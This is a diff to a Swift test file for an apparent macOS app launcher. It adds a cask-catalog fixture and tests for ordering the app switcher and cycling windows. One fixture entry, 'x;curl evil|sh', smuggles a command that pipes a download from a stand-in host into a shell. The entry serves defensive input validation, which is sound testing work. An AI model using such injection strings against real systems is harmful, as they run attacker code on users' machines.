@@ -23,7 +23,8 @@ final class LauncherTests: XCTestCase {
         [{"token":"firefox","name":["Mozilla Firefox"],"desc":"Web browser","homepage":"https://firefox.com"},
          {"token":"old","name":["Old"],"desc":"","homepage":"","disabled":true},
          {"token":"older","name":["Older"],"desc":"","homepage":"","deprecated":true},
-         {"token":"bare"}]
+         {"token":"bare"},
+         {"token":"x;curl evil|sh"}, {"token":"--force"}]
         """
         let casks = Cask.parseCatalog(Data(json.utf8))
         XCTAssertEqual(casks.map(\.token), ["firefox", "bare"])
@@ -56,5 +57,35 @@ final class LauncherTests: XCTestCase {
         XCTAssertEqual(r.paths.filter { $0 == "/Applications/App20.app" }.count, 1)
         XCTAssertGreaterThan(r.boost("/Applications/App20.app"), r.boost("/Applications/App39.app"))
         XCTAssertEqual(r.boost("/Applications/Nope.app"), 0)
+    }
+}
+
+final class AppSwitchListTests: XCTestCase {
+    func testSplitAppGetsOneEntryPerWorkspaceLastUsedFirst() {
+        // Ghostty (1) on workspaces 1 and 4, two windows on 4; Mail (2) on 2.
+        let windows: [(app: Int32, workspace: Int)] = [(1, 1), (1, 4), (1, 4), (2, 2)]
+        let list = AppSwitchList.make(windows: windows, appOrder: [2, 1], workspaceOrder: [2, 1, 4], lastWorkspace: [1: 4])
+        XCTAssertEqual(list.map(\.app), [2, 1, 1])
+        XCTAssertEqual(list.map(\.workspace), [2, 4, 1])
+        XCTAssertEqual(list.map(\.windows), [1, 2, 1])
+        XCTAssertEqual(list.map(\.isSplit), [false, true, true])
+    }
+
+    func testAppsNeverBroughtForwardStillAppear() {
+        let list = AppSwitchList.make(windows: [(7, 3), (8, 5)], appOrder: [8], workspaceOrder: [], lastWorkspace: [:])
+        XCTAssertEqual(list.map(\.app), [8, 7])
+    }
+
+    func testWorkspacesWithoutHistoryGoInNumberOrder() {
+        let list = AppSwitchList.make(windows: [(1, 9), (1, 3), (1, 6)], appOrder: [1], workspaceOrder: [], lastWorkspace: [:])
+        XCTAssertEqual(list.map(\.workspace), [3, 6, 9])
+    }
+
+    func testCycleStepsAndWraps() {
+        XCTAssertEqual(WindowCycle.next([10, 11, 12], after: 11), 12)
+        XCTAssertEqual(WindowCycle.next([10, 11, 12], after: 12), 10)
+        XCTAssertEqual(WindowCycle.next([10, 11, 12], after: 99), 10)
+        XCTAssertEqual(WindowCycle.next([10, 11], after: nil), 10)
+        XCTAssertNil(WindowCycle.next([Int](), after: nil))
     }
 }
